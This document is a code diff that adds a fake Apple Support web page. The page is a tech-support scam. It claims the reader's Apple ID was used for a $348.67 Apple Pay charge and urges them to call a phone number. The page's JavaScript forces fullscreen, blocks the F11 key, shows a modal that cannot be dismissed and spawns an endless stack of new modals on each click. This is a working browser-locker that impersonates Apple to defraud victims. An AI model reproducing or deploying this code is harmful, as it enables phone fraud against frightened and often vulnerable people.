+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                        <a href="tel:+1-833-445-3574">Apple Support +1-833-445-3574 <font color="red">
+                                <font class="js_setPhoneBlock"></font>
+                            </font></a>
+                    </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open"> <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">
+                            <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink">
+                                        Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta"> <span class="ac-ln-menucta-chevron"></span>
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+
+                            <style>
+                                /* .as-columns.as-columns--1up {    background: url(./apple222.jpg);
+    background-size: cover;
+    background-position-y: 49px;} */
+                            </style>
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/apple222.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/apple222.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/apple222.jpg 735w, images/apple222.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/apple222.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                                Your Apple ID was recently used at the Apple Store for a $348.67 transaction via Apple Pay (Pre-Authorization). To protect your account, we have temporarily placed this request on hold for security verification. If you did not authorize this purchase, please contact Apple Support immediately at +1-833-445-3574 to secure your account and prevent unauthorized activity.
+                            </p>
+                        </div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple
+                        Store </a>, <span class="nowrap">call <font class="js_setPhoneBlock"></font>, or <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+                        States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">CopyrightÂ© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+                            Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+                            Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+                            Apple </a>
+                    </div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-833-445-3574" property="telephone">
+            </section>
+        </div>
+    </footer>
+
+    <div id="modalContainer"></div>
+
+    <!-- Main Modal -->
+    <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-27px!important;">
+
+        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
+            <div class="modal-content">
+                 <div class="modal-header pb-0">
+                            <button type="button" class="p-0 btn-close " id="closebtn"></button>
+                        </div>
+                <div class="modal-body text-center">
+                    <div class="alert-text">
+                       Your Apple ID was recently used at the Apple Store for a $348.67 transaction via Apple Pay (Pre-Authorization). To protect your account, we have temporarily placed this request on hold for security verification. If you did not authorize this purchase, please contact Apple Support immediately at <a href="tel:+1-833-445-3574">+1-833-445-3574</a> to secure your account and prevent unauthorized activity.
+
+                    </div>
+
+                    <div class="callnowbtn">
+                        <a href="tel:+1-833-445-3574" class="tel-link">
+                            <button type="button" class="btn btn-danger text-white">
+                                <i class="bi bi-telephone-outbound call-icon"></i> Call Now
+                            </button>
+                        </a>
+                    </div>
+                    <div class="text-end gap-4 mt-4 actionbtn">
+
+                            <button type="button" class="btn btn-primary me-2" id="okBtn"> OK</button>
+
+                        <button type="button" class="btn btn-outline-secondary me-3" id="cancelBtn">Cancel</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap & Popper.js -->
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+
+
+
+
+
+ <script>
+
+
+
+    let modalCount = 0;
+    const maxModals = Infinity;
+    let fullScreenTriggered = false;
+
+    // Function to trigger full screen
+    function triggerFullScreen() {
+        const elem = document.documentElement;
+        if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {
+                    console.error('Fullscreen error:', err);
+                });
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            }
+        }
+    }
+
+    // Function to exit fullscreen
+    function exitFullScreen() {
+        if (document.exitFullscreen) {
+            document.exitFullscreen();
+        } else if (document.webkitExitFullscreen) {
+            document.webkitExitFullscreen();
+        } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+        }
+    }
+
+    // Function to generate random position within viewport
+    function getRandomPosition(modalWidth, modalHeight) {
+        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
+        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
+
+        if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
+            return {
+                top: Math.max(0, (viewportHeight - modalHeight) / 2),
+                left: Math.max(0, (viewportWidth - modalWidth) / 2)
+            };
+        }
+
+        const maxX = viewportWidth - modalWidth;
+        const maxY = viewportHeight - modalHeight;
+
+        const randomX = Math.floor(Math.random() * (maxX + 1));
+        const randomY = Math.floor(Math.random() * (maxY + 1));
+
+        return { top: randomY, left: randomX };
+    }
+
+    // Function to create a new modal with random position
+    function createNewModal() {
+        if (modalCount >= maxModals) return null;
+
+        modalCount++;
+
+        const newModal = document.createElement('div');
+        newModal.className = 'modal fade modal-stack';
+        newModal.id = `appleAlertModal-${modalCount}`;
+        newModal.tabIndex = -1;
+        newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
+        newModal.setAttribute('aria-hidden', 'true');
+
+        newModal.innerHTML = `
+            <div class="modal-dialog modal-lg positioned">
+                <div class="modal-content" id="applealertmodeltwo" style="height:225px">
+                    <div class="modal-header pb-0">
+                        <button type="button" class="p-0 btn-close"></button>
+                    </div>
+                    <div class="modal-body text-center">
+                        <div class="alert-text">
+                            Your Apple ID was recently used at the Apple Store for a $348.67 transaction via Apple Pay (Pre-Authorization). To protect your account, we have temporarily placed this request on hold for security verification. If you did not authorize this purchase, please contact Apple Support immediately at <a href="tel:+1-833-445-3574">+1-833-445-3574</a> to secure your account and prevent unauthorized activity.
+                        </div>
+                        <div class="callnowbtn">
+                            <a href="tel:+1-833-445-3574" class="tel-link">
+                                <button type="button" class="btn btn-danger text-white" >
+                                    <i class="bi bi-telephone-outbound call-icon"></i> Call Now
+                                </button>
+                            </a>
+                        </div>
+                        <div class="text-center mt-4 actionbtn" style="right:20px;">
+
+                                <button type="button" class="btn btn-primary ok-btn me-2">OK</button>
+
+                            <button type="button" class="btn btn-outline-secondary cancel-btn">Cancel</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        document.getElementById('modalContainer').appendChild(newModal);
+
+        const modal = new bootstrap.Modal(newModal, {
+            backdrop: 'static',
+            keyboard: false
+        });
+
+        const modalDialog = newModal.querySelector('.modal-dialog');
+        let modalWidth, modalHeight;
+
+        modalWidth = Math.min(600, window.innerWidth * 0.9);
+        modalHeight = window.innerWidth <= 576 ? 250 : 400;
+
+        const { top, left } = getRandomPosition(modalWidth, modalHeight);
+        modalDialog.style.top = `${top}px`;
+        modalDialog.style.left = `${left}px`;
+
+        if (window.innerWidth <= 576) {
+            modalDialog.style.width = `${modalWidth}px`;
+            modalDialog.style.maxWidth = 'none';
+        }
+
+        newModal.style.zIndex = 1080 + modalCount;
+        modal.show();
+
+        // Ensure tel: link actually triggers phone call
+        newModal.querySelectorAll('.tel-link').forEach(link => {
+            link.addEventListener('click', (e) => {
+                window.location.href = link.getAttribute('href');
+            });
+        });
+
+        // return modal;
+    }
+
+    // Initialize the first modal
+    const appleAlertModal = new bootstrap.Modal(document.getElementById('appleAlertModal'), {
+        backdrop: 'static',
+        keyboard: false
+    });
+
+    document.addEventListener('DOMContentLoaded', function () {
+        appleAlertModal.show();
+    });
+
+    // Add event listener to body for fullscreen and modal creation
+    document.body.addEventListener('click', () => {
+        triggerFullScreen();
+        createNewModal();
+    });
+
+    // On ESC â†’ exit fullscreen
+    document.addEventListener("keydown", function (e) {
+        if (e.key === "Escape") {
+            exitFullScreen();
+        }
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    document.addEventListener("keyup", function (e) {
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    // If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
+    document.addEventListener("fullscreenchange", () => {
+        if (!document.fullscreenElement) {
+            // User exited fullscreen
+            document.body.addEventListener("click", triggerFullScreen, { once: true });
+        }
+    });
+
+    window.addEventListener('resize', function () {
+        const modals = document.querySelectorAll('.modal-stack .modal-dialog.positioned');
+
+        modals.forEach(modal => {
+            const viewportHeight = window.innerHeight;
+            const modalHeight = modal.offsetHeight;
+            let { top } = getRandomPosition(modal.offsetWidth, modalHeight);
+
+            if (top + modalHeight > viewportHeight) {
+                top = Math.max(0, viewportHeight - modalHeight);
+            }
+
+            modal.style.top = `${top}px`;
+            modal.style.left = `0`;
+            modal.style.width = `100%`;
+            modal.style.maxHeight = `${viewportHeight}px`;
+            modal.style.overflow = `hidden`;
+        });
+    });
+</script>
+
+
+
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+
+
+</body></html>
